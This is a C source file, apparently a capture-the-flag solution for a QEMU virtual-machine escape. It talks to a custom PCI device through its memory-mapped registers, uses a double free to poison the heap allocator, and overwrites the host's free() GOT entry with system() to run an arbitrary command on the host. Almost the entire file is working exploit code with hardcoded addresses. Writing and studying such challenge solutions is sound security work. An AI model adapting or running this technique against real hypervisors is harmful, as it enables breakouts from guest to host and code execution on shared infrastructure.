// gcc exploit.c -static -o exploit
// exploit for Ubuntu 18.04 (maybe differ from real problem server)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>

#define IO_READ(addr)		(*(uint32_t*)(memio + (addr)))
#define IO_WRITE(addr, val)	*(uint32_t*)(memio + (addr)) = (val)

#define OOO(cmd, idx, addr)	(((((cmd) << 4) + (idx)) << 16) + (addr))

const uint64_t addr_plt_system	= 0x0413df0;
const uint64_t addr_plt_free	= 0x04141f0;
const uint64_t addr_got_free	= 0x11301a0;

void *memio;

static void ooo_malloc(char idx, uint32_t size);
static void ooo_free(char idx);
static void ooo_write(char idx, uint32_t ofs, void *buf, uint64_t len);
static void ooo_write_qword(char idx, uint32_t ofs, uint64_t val);
static void ooo_read(void *buf, char idx, uint32_t ofs, uint64_t len);
static uint64_t ooo_read_qword(char idx, uint32_t ofs);
static void dump(const void *buf, unsigned long size);

int main(int argc, char *argv[]){
	int fd;
	char *cmd = argc > 1 ? argv[1] : "DISPLAY=:0 xcalc";

	if((fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR)) == -1){
		perror("open");
		exit(-1);
	}

	if((memio = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){
		perror("mmap");
		exit(-1);
	}

	ooo_malloc(0, 0x18);

	ooo_free(0);
	ooo_free(0);
	uint64_t addr_heap = ooo_read_qword(0, 0);
	printf("[*] addr_heap 	= 0x%016lx\n", addr_heap);

	ooo_write_qword(0, 0, addr_got_free);
	ooo_malloc(0, 0x18);
	ooo_malloc(1, 0x18);

	ooo_write_qword(1, 0, addr_plt_system);
	ooo_write(0, 0, cmd, strlen(cmd)+1);

	ooo_free(0);

	ooo_write_qword(1, 0, addr_plt_free + 6);
	ooo_free(0);
	ooo_write_qword(0, 0, 0);

	close(fd);
}

static void ooo_malloc(char idx, uint32_t size){
	IO_WRITE(OOO(0, idx, 0), size/8);
}

static void ooo_free(char idx){
	IO_WRITE(OOO(1, idx, 0), 0);
}

static void ooo_write(char idx, uint32_t ofs, void *buf, uint64_t len){
	memcpy(&IO_READ(OOO(2, idx, ofs)), buf, len);
}

static void ooo_write_qword(char idx, uint32_t ofs, uint64_t val){
	memcpy(&IO_READ(OOO(2, idx, ofs)), &val, sizeof(uint64_t));
}

static void ooo_read(void *buf, char idx, uint32_t ofs, uint64_t len){
	memcpy(buf, &IO_READ(OOO(0, idx, ofs)), len);
}

static uint64_t ooo_read_qword(char idx, uint32_t ofs){
	uint64_t val;
	memcpy(&val, &IO_READ(OOO(0, idx, ofs)), sizeof(uint64_t));
	return val;
}

static void dump(const void *buf, unsigned long size){
	const unsigned long *p = buf;

	size = (size+7) & ~(8-1);
	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(int i = 0; i < size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
